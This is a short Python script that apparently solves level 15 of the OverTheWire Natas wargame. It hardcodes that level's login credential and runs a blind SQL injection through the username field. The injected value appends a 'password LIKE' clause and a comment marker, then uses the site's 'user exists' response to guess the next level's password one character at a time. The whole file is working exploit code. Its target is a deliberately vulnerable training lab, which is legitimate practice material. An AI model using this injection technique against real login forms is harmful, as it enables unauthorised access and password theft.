#!/usr/bin/python3

import requests
import string
username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

url = 'http://'+username+'.natas.labs.overthewire.org/'
session = requests.session()
alphabet = string.ascii_letters+string.digits
secret=""
while True:
    for ch in alphabet:
        #print("trying charachter:\t"+secret+ch)
        data = {'username' : 'natas16" AND password LIKE "'+secret+ch+'%" # '}
        response = session.post(url,data = data,auth = (username, password))
        content = response.text

        if('user exists' in content):
            #print(content)
            secret = secret+ch
            break;
    if(len(secret) == len(password)):
        break;
print("Password for natas 16:\t"+secret)
